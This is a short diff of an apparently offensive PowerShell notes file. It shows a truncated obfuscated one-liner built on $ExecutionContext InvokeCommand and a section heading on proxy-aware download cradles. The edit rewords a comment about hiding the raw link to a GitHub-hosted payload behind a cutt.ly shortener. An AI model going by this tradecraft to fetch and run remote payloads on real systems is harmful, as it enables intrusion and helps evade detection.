@@ -10,7 +10,7 @@ ps> $ExecutionContext|ForEach{(GV _).Value.InvokeCommand.(($ExecutionContext.Inv
 
 
 # Proxy aware download cradles
-# Info: Because you are limited in length, you have to use a shortcut link to the raw link from your hosted payload on Github
+# Info: I use a shortcut link to the raw link from your hosted payload on Github
 # For example, https://cutt.ly/syFzILH directs to the raw link of hosted payload on github
 
 # Windows PowerShell default download cradle proxy aware
